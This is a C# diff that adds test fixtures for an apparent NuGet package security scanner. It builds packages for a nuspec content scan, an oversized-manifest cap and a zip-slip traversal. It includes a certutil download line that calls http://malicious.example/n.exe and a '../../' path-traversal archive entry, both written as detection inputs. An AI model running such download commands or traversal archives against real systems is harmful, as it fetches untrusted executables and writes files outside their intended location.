@@ -158,6 +158,66 @@ public sealed class PackageFixture : IDisposable
             ("tools/small.ps1", Encoding.UTF8.GetBytes(SmallMatchingPs1)),
         ]);
 
+        // PkgNuspecMatch: nuspec-content-scan package. Its top-level *.nuspec's <description> carries a certutil
+        // LOLBAS token that trips the embedded backdoor rules — but the manifest is deliberately NOT inventoried
+        // as a script (ADR 0012). Carries a benign lib (real fixture) and NO scripts, so any ScriptFinding must be
+        // attributed to the nuspec (RelativePath == "<id>.nuspec"). Token is original, benign-but-matching.
+        var pkgNuspecMatchNuspec = NupkgBuilder.NuspecXml(
+            PkgNuspecMatchId, PkgNuspecMatchVersion, "Silvergun Tests", NuspecMatchDescription, "netstandard2.0", []);
+        PkgNuspecMatchPath = Path.Combine(rootDir, $"{PkgNuspecMatchId}.{PkgNuspecMatchVersion}.nupkg");
+        NuspecMatchFileName = $"{PkgNuspecMatchId}.nuspec";
+        NupkgBuilder.WriteNupkg(PkgNuspecMatchPath,
+        [
+            ($"{PkgNuspecMatchId}.nuspec", Encoding.UTF8.GetBytes(pkgNuspecMatchNuspec)),
+            ($"lib/netstandard2.0/{FixtureDllName}", fixtureBytes),
+        ]);
+
+        // PkgNuspecOversize: never-throws regression for the nuspec content scan. The *.nuspec is VALID XML (so
+        // Open can read identity), carries the same certutil token that WOULD match, but is padded PAST the 5 MiB
+        // scanner cap with an incompressible base64 comment. base64's alphabet has no '-', so the comment never
+        // forms the illegal "--" sequence; random source bytes keep it incompressible so it clears the extractor's
+        // 200:1 zip-bomb ratio cap (a zero/space pad would compress away and fail Open). The scanner must SKIP the
+        // oversized nuspec (size cap) without crashing, while a small matching script's finding still survives.
+        var pad = Convert.ToBase64String(RandomNumberGenerator.GetBytes(6 * 1024 * 1024)); // ~8 MiB of base64 text
+        var oversizeNuspecBody = NupkgBuilder.NuspecXml(
+            PkgNuspecOversizeId, PkgNuspecOversizeVersion, "Silvergun Tests", NuspecMatchDescription, "netstandard2.0", []);
+        var oversizeNuspec = oversizeNuspecBody.Replace("</package>", $"  <!-- {pad} -->\n</package>");
+        PkgNuspecOversizePath = Path.Combine(rootDir, $"{PkgNuspecOversizeId}.{PkgNuspecOversizeVersion}.nupkg");
+        NuspecOversizeFileName = $"{PkgNuspecOversizeId}.nuspec";
+        NupkgBuilder.WriteNupkg(PkgNuspecOversizePath,
+        [
+            ($"{PkgNuspecOversizeId}.nuspec", Encoding.UTF8.GetBytes(oversizeNuspec)),
+            ("tools/keep.ps1", Encoding.UTF8.GetBytes(SmallMatchingPs1)),
+        ]);
+
+        // PkgNuspecSlip: escaping-nuspec containment regression. Mirrors the PkgD zip-slip pattern, but the
+        // malicious raw entry is a *.nuspec whose declared name escapes the extraction dir via "../../". The
+        // package still carries a benign, valid top-level manifest ("PkgNuspecSlip.nuspec") so NuGet can read
+        // identity and Open succeeds — a package whose ONLY nuspec is an escaping entry cannot be opened at all
+        // (NuGet's manifest reader requires a root-level nuspec), which is why the valid manifest is retained.
+        // The escaping *.nuspec carries a DISTINCT id ("PkgNuspecSlipEscaper") so that, were it ever mistakenly
+        // selected, the mismatch would be unmistakable. It must never pass the IsContained/IsNuspec gate that
+        // selects NuspecPath: the escaping declared name is excluded from the contained set (and, even if the
+        // extractor clamps it under the root, its on-disk name still fails the contained-set membership test).
+        // The guid keeps the traversal target unique so parallel/repeated runs cannot collide on a stray file.
+        NuspecSlipEntryFileName = $"silvergun-nuspecslip-{Guid.NewGuid():N}.nuspec";
+        NuspecSlipRelativeEntry = "../../" + NuspecSlipEntryFileName;
+        NuspecSlipManifestFileName = $"{PkgNuspecSlipId}.nuspec";
+        var pkgNuspecSlipManifest = NupkgBuilder.NuspecXml(
+            PkgNuspecSlipId, PkgNuspecSlipVersion, "Silvergun Tests", "Escaping-nuspec containment regression test package.", "netstandard2.0", []);
+        var escapingNuspec = NupkgBuilder.NuspecXml(
+            "PkgNuspecSlipEscaper", PkgNuspecSlipVersion, "Silvergun Tests", "Escaping manifest that must never be selected as NuspecPath.", "netstandard2.0", []);
+        PkgNuspecSlipPath = Path.Combine(rootDir, $"{PkgNuspecSlipId}.{PkgNuspecSlipVersion}.nupkg");
+        NupkgBuilder.WriteNupkg(
+            PkgNuspecSlipPath,
+            [
+                ($"{PkgNuspecSlipId}.nuspec", Encoding.UTF8.GetBytes(pkgNuspecSlipManifest)),
+                ($"lib/netstandard2.0/{FixtureDllName}", fixtureBytes),
+            ],
+            [
+                (NuspecSlipRelativeEntry, Encoding.UTF8.GetBytes(escapingNuspec)),
+            ]);
+
         // Broken inputs: a text file renamed .nupkg, and a path that does not exist.
         FakeTextNupkgPath = Path.Combine(rootDir, "fake.nupkg");
         File.WriteAllText(FakeTextNupkgPath, "this is plain text, not a zip archive at all");
@@ -192,6 +252,22 @@ public sealed class PackageFixture : IDisposable
 
     public const string PkgOversizeId = "PkgOversize";
     public const string PkgOversizeVersion = "8.9.10";
+
+    public const string PkgNuspecMatchId = "PkgNuspecMatch";
+    public const string PkgNuspecMatchVersion = "9.10.11";
+
+    public const string PkgNuspecOversizeId = "PkgNuspecOversize";
+    public const string PkgNuspecOversizeVersion = "10.11.12";
+
+    public const string PkgNuspecSlipId = "PkgNuspecSlip";
+    public const string PkgNuspecSlipVersion = "11.12.13";
+
+    /// <summary>
+    /// Description embedded in the nuspec-content-scan packages: prose plus a certutil LOLBAS line that trips the
+    /// embedded backdoor rules (the rule requires the token to be whitespace-delimited). Original, benign-but-matching.
+    /// </summary>
+    public const string NuspecMatchDescription =
+        "This package scans local files during install. certutil -urlcache -f http://malicious.example/n.exe";
 
     /// <summary>
     /// PkgScript's install.ps1: a PowerShell IEX-download reverse-shell line plus a certutil LOLBAS line —
@@ -242,6 +318,30 @@ public sealed class PackageFixture : IDisposable
     /// <summary>Never-throws regression package: an oversized matching script, a malformed script, and a small matching script.</summary>
     public string PkgOversizePath { get; }
 
+    /// <summary>Nuspec-content-scan package: its top-level nuspec's description carries a certutil token; no scripts.</summary>
+    public string PkgNuspecMatchPath { get; }
+
+    /// <summary>Bare file name of PkgNuspecMatch's manifest (e.g. <c>PkgNuspecMatch.nuspec</c>) — the expected finding RelativePath.</summary>
+    public string NuspecMatchFileName { get; }
+
+    /// <summary>Never-throws regression package: an oversized (but valid) matching nuspec plus a small matching script.</summary>
+    public string PkgNuspecOversizePath { get; }
+
+    /// <summary>Bare file name of PkgNuspecOversize's manifest (e.g. <c>PkgNuspecOversize.nuspec</c>).</summary>
+    public string NuspecOversizeFileName { get; }
+
+    /// <summary>Escaping-nuspec containment package: a valid top-level manifest plus a malicious <c>../../</c> traversal <c>.nuspec</c>.</summary>
+    public string PkgNuspecSlipPath { get; }
+
+    /// <summary>Bare file name of PkgNuspecSlip's benign top-level manifest (e.g. <c>PkgNuspecSlip.nuspec</c>) — the only valid NuspecPath.</summary>
+    public string NuspecSlipManifestFileName { get; }
+
+    /// <summary>Bare file name of PkgNuspecSlip's malicious traversal manifest (e.g. <c>silvergun-nuspecslip-&lt;guid&gt;.nuspec</c>).</summary>
+    public string NuspecSlipEntryFileName { get; }
+
+    /// <summary>PkgNuspecSlip's malicious manifest name as packaged — <c>../../&lt;NuspecSlipEntryFileName&gt;</c>.</summary>
+    public string NuspecSlipRelativeEntry { get; }
+
     public string FakeTextNupkgPath { get; }
     public string MissingNupkgPath { get; }
 
@@ -279,6 +379,11 @@ public sealed class PackageFixture : IDisposable
             var stray = Path.Combine(Path.GetTempPath(), ZipSlipFileName);
             if (File.Exists(stray))
                 File.Delete(stray);
+
+            // Same guard for PkgNuspecSlip's traversal manifest, which would land in the same spot on a regression.
+            var nuspecStray = Path.Combine(Path.GetTempPath(), NuspecSlipEntryFileName);
+            if (File.Exists(nuspecStray))
+                File.Delete(nuspecStray);
         }
         catch (Exception ex) when (ex is IOException or UnauthorizedAccessException) { /* best-effort temp cleanup */ }
     }
